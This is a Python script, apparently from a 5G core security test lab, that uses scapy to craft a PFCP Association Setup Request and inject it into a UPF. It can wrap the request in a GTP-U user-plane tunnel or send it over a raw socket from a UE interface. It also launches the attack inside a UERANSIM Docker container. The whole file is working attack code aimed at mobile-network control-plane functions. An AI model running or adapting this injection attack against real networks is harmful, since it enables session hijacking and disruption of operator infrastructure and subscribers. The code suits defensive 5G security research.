from scapy.all import sendp, send
from scapy.layers.l2 import Ether
from scapy.contrib.gtp import *
from scapy.contrib.pfcp import *

from src import *
import sys
import random
import time
import socket
import docker


seq = 1


def new_seq(rand=False):
    global seq
    if rand:
        seq = random.randint(0, 0xFFFF)
    else:
        seq += 1
    return seq


def build_PFCP_association_setup_req(dest_addr, ue_addr, src_port, dest_port):
    global seq

    seq = new_seq(True)

    # Trick to bypass scapy's bad parsing
    node_id = Raw(bytes(IE_NodeId(id_type=0, ipv4=ue_addr)))
    recovery_timestamp = Raw(bytes(IE_RecoveryTimeStamp(timestamp=int(time.time()))))
    pfcp_msg = (
        PFCP(version=1, message_type=5, seid=0, S=0, seq=seq)
        / node_id
        / recovery_timestamp
    )

    packet = (
        IP(src=ue_addr, dst=dest_addr) / UDP(sport=src_port, dport=dest_port) / pfcp_msg
    )
    packet = packet.__class__(bytes(packet))
    return packet


def build_malicious_pfcp_in_gtp_packet(
    src_addr,
    dest_addr,
    teid,
    ue_addr,
    gtpu_src_port=2152,
    gtpu_dest_port=2152,
    pfcp_src_port=8805,
    pfcp_dest_port=8805,
):
    pfcp_packet = build_PFCP_association_setup_req(
        src_addr=src_addr,
        dest_addr=dest_addr,
        ue_addr=ue_addr,
        src_port=pfcp_src_port,
        dest_port=pfcp_dest_port,
    )

    gtp_packet = (
        IP(src=src_addr, dst=dest_addr)
        / UDP(sport=gtpu_src_port, dport=gtpu_dest_port)
        / GTP_U_Header(teid=teid)
        / pfcp_packet
    )

    return gtp_packet


def send_malicious_pfcp_in_gtp_packet(
    src_addr,
    dest_addr,
    ue_addr,
    teid,
):
    """Sending a PFCP packet through user plane GTP tunnel to the UPF
    Args:
        src_addr (str): Source IP for outer (GTP-U) and inner (PFCP) IP layers.
        dest_addr (str): Destination IP for outer (GTP-U) and inner (PFCP) IP layers.
        src_port (int): Source port for the inner UDP layer (encapsulating PFCP).
        dest_port (int): Destination port for the inner UDP layer (encapsulating PFCP, default: random).
        teid (int): GTP-U Tunnel Endpoint Identifier.

    """

    packet = build_malicious_pfcp_in_gtp_packet(
        src_addr=src_addr,
        dest_addr=dest_addr,
        teid=teid,
        ue_addr=ue_addr,
    )

    packet.show()

    print(
        f"[$]  Sending malicious PFCP packet in GTP tunnel to {dest_addr} with TEID {teid}"
    )
    send(packet)
    print(f"[+]  Packet sent successfully")


def start_pfcp_in_gtp_attack_from_evil(ue_addr, iname):
    client = docker.DockerClient(base_url="unix://var/run/docker.sock")
    container = client.containers.get("ueransim")
    res = container.exec_run(
        cmd=f'/bin/bash -c "cd /app/ && python3 -m src.attacks.gtp_u.pfcpInGtpAttack {ue_addr} {iname}" ',
        stdout=True,
        stderr=True,
        stream=False,
    )
    print(res.output.decode("utf-8"))


def send_malicious_pfcp_packet_from_ue(ue_addr, upf_addr, iname):
    print(f"---------- PFCP IN GTP ATTACK ----------")
    print(f"Sending pfcp request from UE {ue_addr} to UPF {upf_addr} on iface {iname} ")

    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((iname, 0))

    pkt = build_PFCP_association_setup_req(
        dest_addr=upf_addr, ue_addr=ue_addr, src_port=8805, dest_port=8805
    )
    pkt.show()
    s.send(bytes(pkt))


if __name__ == "__main__":
    # send_malicious_pfcp_in_gtp_packet(
    #     src_addr=ip_list["EVIL"],
    #     dest_addr=ip_list["UPF"],
    #     ue_addr=ip_list["UE"],
    #     teid=int(sys.argv[1], 0),
    # )
    if len(sys.argv) != 3:
        print(f"{sys.argv[0]} <ue_addr> <iname>")

    send_malicious_pfcp_packet_from_ue(
        ue_addr=sys.argv[1], upf_addr=ip_list["UPF"], iname=sys.argv[2]
    )
